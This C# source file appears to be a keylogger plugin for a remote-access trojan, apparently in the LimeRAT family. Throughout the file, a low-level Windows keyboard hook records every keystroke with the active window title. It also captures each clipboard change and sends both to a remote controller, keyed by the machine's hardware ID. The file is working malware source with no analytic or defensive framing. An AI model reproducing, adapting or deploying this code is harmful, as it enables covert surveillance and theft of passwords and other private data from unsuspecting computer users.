using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Packet").AsString)
            {
                case "keyLogger":
                    {
                        HandleLimeLogger.isON = false;
                        break;
                    }
            }
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }


    public class ClipboardNotification : Form
    {
        public ClipboardNotification()
        {
            SetParent(Handle, HWND_MESSAGE);
            AddClipboardFormatListener(Handle);
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == WM_CLIPBOARDUPDATE)
            {
                Debug.WriteLine($"Clipboard {Clipboard.GetCurrentText()}");
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("log").AsString = $"\n\r[Clipboard]\n{Clipboard.GetCurrentText()}\n\r";
                Connection.Send(msgpack.Encode2Bytes());
            }
            base.WndProc(ref m);
        }

        private const int WM_CLIPBOARDUPDATE = 0x031D;
        private static IntPtr HWND_MESSAGE = new IntPtr(-3);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }

    internal static class Clipboard
    {
        public static string GetCurrentText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }
    }

    public static class HandleLimeLogger
    {
        public static bool isON = false;
        public static void Run()
        {
            _hookID = SetHook(_proc);
            new Thread(() =>
            {
                while (Connection.IsConnected)
                {
                    Thread.Sleep(1000);
                    if (isON == false)
                    {
                        break;
                    }
                }
                UnhookWindowsHookEx(_hookID);
                Connection.Disconnected();
                GC.Collect();
                Application.Exit();
            }).Start();
            Application.Run(new ClipboardNotification());
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            try
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WHKEYBOARDLL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                isON = false;
                return IntPtr.Zero;
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    bool capsLockPressed = (GetKeyState(0x14) & 0xffff) != 0;
                    bool shiftPressed = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;
                    string currentKey = KeyboardLayout((uint)vkCode);

                    if (capsLockPressed || shiftPressed)
                    {
                        currentKey = currentKey.ToUpper();
                    }
                    else
                    {
                        currentKey = currentKey.ToLower();
                    }

                    if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                        currentKey = "[" + (Keys)vkCode + "]";
                    else
                    {
                        switch (((Keys)vkCode).ToString())
                        {
                            case "Space":
                                currentKey = " ";
                                break;
                            case "Return":
                                currentKey = "[ENTER]\n";
                                break;
                            case "Escape":
                                currentKey = "[ESC]\n";
                                break;
                            case "Back":
                                currentKey = "[Back]";
                                break;
                            case "Tab":
                                currentKey = "[Tab]\n";
                                break;
                        }
                    }

                    if (!string.IsNullOrEmpty(currentKey))
                    {
                        StringBuilder sb = new StringBuilder();
                        if (CurrentActiveWindowTitle == GetActiveWindowTitle())
                        {
                            sb.Append(currentKey);
                        }
                        else
                        {
                            sb.Append($"\n\r[{DateTime.Now.ToShortTimeString()}] [{GetActiveWindowTitle()}]");
                            sb.Append($"\n{currentKey}");
                        }
                        MsgPack msgpack = new MsgPack();
                        msgpack.ForcePathObject("Packet").AsString = "keyLogger";
                        msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                        msgpack.ForcePathObject("log").AsString = sb.ToString();
                        Connection.Send(msgpack.Encode2Bytes());
                    }
                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
            catch
            {
                return IntPtr.Zero;
            }
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return "";
                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), out uint processId));
                ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 5, 0, keyboardLayout);
                return sb.ToString();
            }
            catch { }
            return ((Keys)vkCode).ToString();
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                StringBuilder stringBuilder = new StringBuilder(nChars);
                IntPtr handle = GetForegroundWindow();
                GetWindowThreadProcessId(handle, out uint pid);
                if (GetWindowText(handle, stringBuilder, nChars) > 0)
                {
                    CurrentActiveWindowTitle = stringBuilder.ToString();
                    return CurrentActiveWindowTitle;
                }
            }
            catch (Exception)
            {
            }
            return "???";
        }

        #region "Hooks & Native Methods"

        private const int WM_KEYDOWN = 0x0100;
        private static readonly LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static readonly int WHKEYBOARDLL = 13;
        private static string CurrentActiveWindowTitle;


        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll")]
        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
        [DllImport("user32.dll")]
        static extern uint MapVirtualKey(uint uCode, uint uMapType);

        #endregion

    }

}
